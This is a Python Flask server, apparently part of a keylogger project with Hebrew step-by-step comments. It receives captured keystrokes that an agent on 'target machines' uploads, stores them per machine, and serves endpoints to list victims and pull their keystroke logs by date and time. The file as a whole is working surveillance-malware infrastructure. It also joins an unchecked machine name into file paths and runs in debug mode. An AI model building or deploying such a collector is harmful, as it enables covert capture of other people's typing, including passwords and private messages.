from flask import Flask, request, jsonify
import os
from datetime import datetime
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# הגדרת תיקייה מרכזית לנתונים
DATA_FOLDER = os.path.join(os.path.dirname(__file__), "data")
if not os.path.exists(DATA_FOLDER):
    os.makedirs(DATA_FOLDER)


# פונקציה ליצירת שם קובץ לפי חותמת זמן
# def generate_log_filename():
#     return "log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"


@app.route('/')
def home():
    return "KeyLogger Server is Running"


# ✅ שלב 3: API לקבלת נתונים מהסוכן ושמירה לקובץ
@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.get_json()
    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400

    machine = data["machine"]
    log_data = data["data"]

    # יצירת תיקייה עבור מכונה אם לא קיימת
    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)

    # יצירת שם קובץ חדש לפי זמן
    file_path = os.path.join(machine_folder, "log.txt")
    # כתיבה לקובץ
    with open(file_path, "a", encoding="utf-8") as f:
        f.write(log_data + "\n" + "="*50 + "\n")

    return jsonify({"status": "success", "file": file_path}), 200


# ✅ שלב 4: API להחזרת רשימת מכונות
@app.route('/api/get_target_machines_list', methods=['GET'])
def get_target_machines_list():
    try:
        machines = [
            name for name in os.listdir(DATA_FOLDER)
            if os.path.isdir(os.path.join(DATA_FOLDER, name))
        ]
        return jsonify(machines), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ✅ שלב 5: API להחזרת נתוני הקשות של מכונה מסוימת

@app.route('/api/get_keystrokes', methods=['GET'])
def get_keystrokes():
    machine = request.args.get("machine")
    date = request.args.get("date")  # פורמט: YYYY-MM-DD
    time_str = request.args.get("time")  # פורמט: HH:MM

    if not machine:
        return jsonify({"error": "Missing 'machine' parameter"}), 400

    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        return jsonify({"error": "Machine not found"}), 404

    file_path = os.path.join(machine_folder, "log.txt")
    if not os.path.exists(file_path):
        return jsonify({"machine": machine, "logs": []}), 200

    # קריאת קובץ
    with open(file_path, "r", encoding="utf-8") as f:
        logs = f.read().split("="*50)

    # סינון לפי תאריך ושעה אם נשלחו
    filtered_logs = []
    for log_entry in logs:
        if not log_entry.strip():
            continue
        if date:
            if f"[{date}" not in log_entry:
                continue
        if time_str:
            if f"{time_str}" not in log_entry:
                continue
        filtered_logs.append(log_entry.strip())

    return jsonify({
        "machine": machine,
        "logs": filtered_logs
    }), 200


if __name__ == '__main__':
    app.run(debug=True)
